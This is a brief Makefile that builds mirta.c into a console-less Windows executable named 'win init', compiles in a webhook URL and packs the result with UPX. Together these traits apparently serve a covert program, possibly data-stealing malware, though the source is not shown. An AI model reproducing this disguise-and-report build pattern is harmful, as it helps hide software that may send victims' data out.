WEBHOOK ?= ""
all: mirta.c
	gcc mirta.c -o "win init" -lgdi32 -mwindows -w -D WEBHOOK=\"$(WEBHOOK)\"
	upx -9 "win init.exe"
